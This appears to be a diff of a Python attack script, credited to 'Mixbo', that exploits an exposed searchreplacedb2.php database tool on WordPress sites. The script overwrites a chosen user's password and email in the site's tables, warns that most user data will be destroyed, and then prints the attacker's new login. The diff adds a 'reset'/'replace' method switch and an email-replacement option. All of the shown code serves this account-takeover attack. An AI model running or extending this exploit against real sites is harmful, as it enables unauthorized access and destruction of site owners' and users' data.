@@ -34,17 +34,19 @@ class Target(object):
 		html = response.read()
 		time.sleep(.050)
 
-	def attack_sequence(self):
-		Target.info("Most user data (including current password and email) will be \x1B[91mdestroyed\x1B[0m")
-		Target.info("\x1B[33mYou have 10 seconds to cancel\x1B[0m")
-		try:
-			time.sleep(10)
-		except:
-			Target.bad("\nUser stopped attack. Leaving...")
-			exit(0)
-		self.keep_user()
-		self.attack_password()
-		self.place_user()
+	def attack_sequence(self,method):
+
+		if method == "replace":
+			Target.info("Most user data (including current password and email) will be \x1B[91mdestroyed\x1B[0m")
+			Target.info("\x1B[33mYou have 10 seconds to cancel\x1B[0m")
+			try:
+				time.sleep(10)
+			except:
+				Target.bad("\nUser stopped attack. Leaving...")
+				exit(0)
+			self.keep_user()
+			self.attack_password()
+			self.place_user()
 
 	def attack_password(self):
 		Target.good("Spraying wp-tables")
@@ -67,6 +69,7 @@ class Target(object):
 	def place_user(self):
 		Target.good("Reverting username to '"+self.user+"'")
 		self.replace("$$$",self.user)
+		Target.good("You should be able to login using \x1B[32m"+self.user+":"+self.password+"\x1B[0m")
 
 	def populate(self):
 		Target.good("Getting info at "+self.url)
@@ -119,14 +122,27 @@ class Target(object):
 		print "[\x1B[33m!\x1B[0m] "+text
 
 def main():
-	parser = optparse.OptionParser("Usage: "+sys.argv[0]+" -t <target_url> [-u <user>] [-p <password>]\n\n~Mixbo (https://github.com/mixbo)")
+	known_methods = ["reset","replace"]
+
+	parser = optparse.OptionParser("Usage: "+sys.argv[0]+" -m <method> -t <target_url> [-u -p -e]\n\n"+sys.argv[0]+" --help (for detailed help)\n~Mixbo (https://github.com/mixbo)")
 	parser.add_option('-t',dest='target_url',type='string',help="The target's URL (ex: http://www.exemple.com/searchreplacedb2.php)")
 	parser.add_option('-u',dest='target_user',type='string',help="The target's user you'll use")
 	parser.add_option('-p',dest='target_password',type='string',help="The new password")
+	parser.add_option('-e',dest='target_email',type='string',help="Email to replace for password reset")
+	parser.add_option('--method',dest='method',type='string',help="Method used. Either 'reset' or 'replace")
 	(options, args) = parser.parse_args()
 
+	if not options.method:
+		Target.bad(parser.usage)
+		exit(1)
+	elif options.method not in known_methods:
+		Target.bad("Unknown method")
+		exit(1)
+	else:
+		method = options.method
+
 	if not options.target_url:
-		print parser.usage
+		Target.bad(parser.usage)
 		exit(1)
 	else:
 		url = options.target_url
@@ -146,9 +162,10 @@ def main():
 		password = "password"
 
 	t = Target(url,user,password)
+	if options.target_email:
+		t.email = options.target_email
 	t.populate()
-	t.attack_sequence()
-	Target.good("You should be able to login using \x1B[32m"+t.user+":"+t.password+"\x1B[0m")
+	t.attack_sequence(method)
 
 if __name__ == "__main__":
 	main()
